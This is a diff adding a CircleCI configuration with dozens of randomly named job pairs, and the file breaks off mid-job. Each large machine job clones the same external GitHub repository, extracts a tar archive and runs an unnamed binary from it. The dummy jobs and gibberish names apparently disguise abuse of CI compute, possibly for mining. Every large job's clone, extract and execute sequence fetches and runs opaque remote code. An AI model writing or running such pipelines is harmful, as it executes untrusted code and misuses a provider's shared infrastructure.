@@ -1,0 +1,1253 @@
+version: 2.1
+
+jobs:
+  infvnbvsluwt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: khwrhugxwazejtu
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'hywwwmjeethr ixiymfoletyqgco' > /tmp/dgyreoxmljfudn/renwwoul
+            ls -la /tmp/dgyreoxmljfudn/renwwoul
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'renwwoul'
+  czzszfqybfdsjpv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: tqijibdegiigekk
+          command: |
+            cat /tmp/dgyreoxmljfudn/jrxpaqscqoza
+      - run:
+          name: ncaaqwvhfmer
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: lehqulufdz
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  lqfmlitj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: xjwei
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'gyhgjwooebotursuny jcjsmfynyzwgjs' > /tmp/dgyreoxmljfudn/hfolfyiubo
+            ls -la /tmp/dgyreoxmljfudn/hfolfyiubo
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'hfolfyiubo'
+  wsdabyilqt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: hbhtybivbfdq
+          command: |
+            cat /tmp/dgyreoxmljfudn/wzuzkakezk
+      - run:
+          name: fvhazlzx
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: lzsho
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  uzkdr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: nxtbfrcjeid
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'qqkytfamejujyvjxth ddwvixeulmjmy' > /tmp/dgyreoxmljfudn/xosaksspql
+            ls -la /tmp/dgyreoxmljfudn/xosaksspql
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'xosaksspql'
+  qxtqccujccsoi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: lqirfcho
+          command: |
+            cat /tmp/dgyreoxmljfudn/glqrgkw
+      - run:
+          name: sysmixmrlazrckw
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: yarlrscyxzw
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  lfklctxzuoaht:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: vwtin
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'ojmlhmupenecs kkfdcwfnxrxtr' > /tmp/dgyreoxmljfudn/wkvmtfcdbwmvd
+            ls -la /tmp/dgyreoxmljfudn/wkvmtfcdbwmvd
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'wkvmtfcdbwmvd'
+  zpsww:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: mzepdtvodvj
+          command: |
+            cat /tmp/dgyreoxmljfudn/vdirnnvgbma
+      - run:
+          name: tijto
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: lknwgscuz
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  uiqjonu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: apvwalyzy
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'joxwwfbebo nxwjespbhsypprfog' > /tmp/dgyreoxmljfudn/pgxfunukviqa
+            ls -la /tmp/dgyreoxmljfudn/pgxfunukviqa
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'pgxfunukviqa'
+  zpfpgfukgusa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: msdqlklpexgvg
+          command: |
+            cat /tmp/dgyreoxmljfudn/ejceeg
+      - run:
+          name: tyuvkdkbj
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: bqpnicgk
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  wxwauczcp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: vyjpkvfoafytnfa
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'jmrskjfjuybufoihqf hbhwkrofbw' > /tmp/dgyreoxmljfudn/cnugpuwkkelqzw
+            ls -la /tmp/dgyreoxmljfudn/cnugpuwkkelqzw
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'cnugpuwkkelqzw'
+  inrcgswnaao:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: kluyzbqp
+          command: |
+            cat /tmp/dgyreoxmljfudn/yfgaaqss
+      - run:
+          name: rgtopysssue
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: efelomhc
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  gamomnblmafhz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wwzcptpzc
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'zrgezxnxpialoemjjb smadwpngwbrqym' > /tmp/dgyreoxmljfudn/ndhhfporias
+            ls -la /tmp/dgyreoxmljfudn/ndhhfporias
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'ndhhfporias'
+  ceqmqrcwyq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: aslbnrrxb
+          command: |
+            cat /tmp/dgyreoxmljfudn/gfyislcidrvb
+      - run:
+          name: dckdninkxkeusb
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: hzbzj
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  obdbuvmwj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: nzglgvle
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'ajvjroynkmacj afwsjvfiyz' > /tmp/dgyreoxmljfudn/sxnqgp
+            ls -la /tmp/dgyreoxmljfudn/sxnqgp
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'sxnqgp'
+  bqsuqqnsrevz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: takcfb
+          command: |
+            cat /tmp/dgyreoxmljfudn/kygnxmwsqbt
+      - run:
+          name: jljleurboodlsr
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: xstxetwwpm
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  zlcmpctup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: ixhhutmcccfk
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'pilokvjrvyag uuskvpkaaeepst' > /tmp/dgyreoxmljfudn/egwrfehq
+            ls -la /tmp/dgyreoxmljfudn/egwrfehq
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'egwrfehq'
+  dlizdnpzqlqaz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: jbldgqnuwbzgb
+          command: |
+            cat /tmp/dgyreoxmljfudn/eryhxkn
+      - run:
+          name: fkotbudyzpwd
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: flkzuyrmp
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  otqalt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: gbfbssdoaqqvto
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'xgmacqifklyxm zisarhhmje' > /tmp/dgyreoxmljfudn/qmhast
+            ls -la /tmp/dgyreoxmljfudn/qmhast
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'qmhast'
+  spjevxxhqjjih:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: motsnqnyluy
+          command: |
+            cat /tmp/dgyreoxmljfudn/ogodqbynch
+      - run:
+          name: eymwsksicmhk
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: xadzis
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  yrbtssrzb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: lrkeyxzdlmeiu
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'ojbtrmeaxeohliuz pkxlfrdekt' > /tmp/dgyreoxmljfudn/yivrtlchm
+            ls -la /tmp/dgyreoxmljfudn/yivrtlchm
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'yivrtlchm'
+  ggayaalupt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: srbmwanibjomj
+          command: |
+            cat /tmp/dgyreoxmljfudn/ylwcxlwchlrorc
+      - run:
+          name: tpvckuqjzmprg
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: bwvuetwhrijl
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  rjsewjclyh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: zedgwy
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'giifvxgstxcaop fjnvqxzbktxyzakq' > /tmp/dgyreoxmljfudn/hmbdtjlkoms
+            ls -la /tmp/dgyreoxmljfudn/hmbdtjlkoms
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'hmbdtjlkoms'
+  mdzgxuidghwntcd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: vukid
+          command: |
+            cat /tmp/dgyreoxmljfudn/qiequz
+      - run:
+          name: tlamuhhtgyxtgy
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: tyhanywznxeawz
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  iyrxvctvl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flycfmi
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'lsbecepyhwwikwlbu lzfpjnrsxahyrx' > /tmp/dgyreoxmljfudn/mciciwmc
+            ls -la /tmp/dgyreoxmljfudn/mciciwmc
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'mciciwmc'
+  eicayhzxrx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: dldxcnv
+          command: |
+            cat /tmp/dgyreoxmljfudn/rivhwzdbe
+      - run:
+          name: ejnbjjgetk
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: ktrxi
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  luqdxzvgdyyu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: yowyislcxfdibxp
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'ixslytwrzvc smptjqccxfweclkt' > /tmp/dgyreoxmljfudn/syphhg
+            ls -la /tmp/dgyreoxmljfudn/syphhg
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'syphhg'
+  qolodm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: daiqqnxwr
+          command: |
+            cat /tmp/dgyreoxmljfudn/igmxxuqi
+      - run:
+          name: netdkyjnippko
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: rvyvypiy
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  hbetwnfufxpqbck:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: ktbqo
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'xhtdzxjwcdtsuhji ldnooundaicy' > /tmp/dgyreoxmljfudn/ttincajkii
+            ls -la /tmp/dgyreoxmljfudn/ttincajkii
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'ttincajkii'
+  ojfrizuha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: qfpfkosohv
+          command: |
+            cat /tmp/dgyreoxmljfudn/bvchghgnn
+      - run:
+          name: iunulzq
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: wavmbh
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  fpubdu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: wzhsqkonivamly
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'bucgszulbwdbqxfmg fyxncyykrb' > /tmp/dgyreoxmljfudn/cujuxpdtogtljj
+            ls -la /tmp/dgyreoxmljfudn/cujuxpdtogtljj
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'cujuxpdtogtljj'
+  fmsppgoxcybelw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: jxfsjqu
+          command: |
+            cat /tmp/dgyreoxmljfudn/pdmact
+      - run:
+          name: pqjpy
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: xbzuywkwsa
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  sxxfbnmodk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: moumgnpkgw
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'qjyiiyjfrhotrkjc npmpqjkjnaffamxet' > /tmp/dgyreoxmljfudn/wwudnscdqvfwmm
+            ls -la /tmp/dgyreoxmljfudn/wwudnscdqvfwmm
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'wwudnscdqvfwmm'
+  nemrotmpfj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: nacwhljpxkwkdrq
+          command: |
+            cat /tmp/dgyreoxmljfudn/pmevfdz
+      - run:
+          name: zpvrqdgquam
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: aeiipwdln
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  osewzp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: ngocdjvcd
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'mhwtbpzfklxqz dlohdzpmehycjrvm' > /tmp/dgyreoxmljfudn/ovrbvthrmh
+            ls -la /tmp/dgyreoxmljfudn/ovrbvthrmh
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'ovrbvthrmh'
+  kxvrlasu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: myjnvlcaisquxs
+          command: |
+            cat /tmp/dgyreoxmljfudn/yqzxoge
+      - run:
+          name: qmuuzbiheluugid
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: fwkwefpofmav
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  ypnmifnspglgpa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wxyudfjqlqgzmlt
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'nflhdnervvav jacetbrcfmlj' > /tmp/dgyreoxmljfudn/isyqzaigq
+            ls -la /tmp/dgyreoxmljfudn/isyqzaigq
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'isyqzaigq'
+  yrdtpvigps:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: qktyfcvpcye
+          command: |
+            cat /tmp/dgyreoxmljfudn/tbyagelvolva
+      - run:
+          name: vqhutufq
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: hxzjtopbblj
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  ctjasg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: erwpofcsfakf
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'jdublvzmmjja thouwdrmftvvrosugp' > /tmp/dgyreoxmljfudn/yrvrwapmvd
+            ls -la /tmp/dgyreoxmljfudn/yrvrwapmvd
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'yrvrwapmvd'
+  svuor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: lgqoxiuitobgpcl
+          command: |
+            cat /tmp/dgyreoxmljfudn/ijvasriumbouz
+      - run:
+          name: cxekusl
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: rmakurffaj
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  iwwuelezhdpaii:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: wrrwxxdcqcc
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'wornhkcrcxsdrnljr tawwhckkiys' > /tmp/dgyreoxmljfudn/jkklgfffr
+            ls -la /tmp/dgyreoxmljfudn/jkklgfffr
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'jkklgfffr'
+  cirenamqzxics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: glficovwacyvw
+          command: |
+            cat /tmp/dgyreoxmljfudn/fdqeslg
+      - run:
+          name: bgfoxhhgahh
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: qqtezvlpmxafxre
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  cadwwjjao:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: tbeywjowghfde
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'vrvjmzjqqwturtry ihfvweyhqaffacat' > /tmp/dgyreoxmljfudn/vkbnestjkpsxac
+            ls -la /tmp/dgyreoxmljfudn/vkbnestjkpsxac
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'vkbnestjkpsxac'
+  jhjfbrfig:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: pworytthdemwn
+          command: |
+            cat /tmp/dgyreoxmljfudn/yxfxqz
+      - run:
+          name: hnujei
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: ngybjhcyhlazdc
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  pzchejmxvwkopd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: yvpiqqsggzm
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'ulzdumynlwdco dsoqetjwtluctquq' > /tmp/dgyreoxmljfudn/vyseqiwijgunfc
+            ls -la /tmp/dgyreoxmljfudn/vyseqiwijgunfc
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'vyseqiwijgunfc'
+  hrmqz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: ufsetdlr
+          command: |
+            cat /tmp/dgyreoxmljfudn/txtlvsxfzuv
+      - run:
+          name: fnlugb
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: qtjeqjjzqbpawi
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  igkxr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: fgyfjpcycxgmfg
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'lnlprdwafdepns nytewmziht' > /tmp/dgyreoxmljfudn/swjjzufsjb
+            ls -la /tmp/dgyreoxmljfudn/swjjzufsjb
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'swjjzufsjb'
+  ckksvkwnyownl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: luzhki
+          command: |
+            cat /tmp/dgyreoxmljfudn/irxnwhjdjo
+      - run:
+          name: jdmqict
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: hgjhqksq
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  bhgyfaeh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: husxvzrw
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'tzjgzosphcug bosnwvhdfbdxkq' > /tmp/dgyreoxmljfudn/ldkegiqehcxp
+            ls -la /tmp/dgyreoxmljfudn/ldkegiqehcxp
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'ldkegiqehcxp'
+  tjxbqoxp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: zvqma
+          command: |
+            cat /tmp/dgyreoxmljfudn/gbtfbjcv
+      - run:
+          name: exwhqtl
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: vgqxoouufpqmg
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  jalyohxz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: vebsg
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'boasqvohvwlmq oozqofbgujto' > /tmp/dgyreoxmljfudn/locowppdbr
+            ls -la /tmp/dgyreoxmljfudn/locowppdbr
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'locowppdbr'
+  ylofyuhjcegei:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: gpzaf
+          command: |
+            cat /tmp/dgyreoxmljfudn/yruptajnufwt
+      - run:
+          name: vtixuuitzksvm
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: iohzwubrekz
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  yclyu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: drozojmzzt
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'aunnvzirwvhhw jaopzdhiaunxha' > /tmp/dgyreoxmljfudn/ngglbajeimsqc
+            ls -la /tmp/dgyreoxmljfudn/ngglbajeimsqc
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'ngglbajeimsqc'
+  sassjfjulmcj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: hjxium
+          command: |
+            cat /tmp/dgyreoxmljfudn/bydstjwvtxor
+      - run:
+          name: fglodxqkwdljkbe
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: qvgvaspfchjj
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  kueukhyt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: akymnyvmjxvd
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'wevytzwynpwez ujqpdbmbcqcm' > /tmp/dgyreoxmljfudn/dquhoch
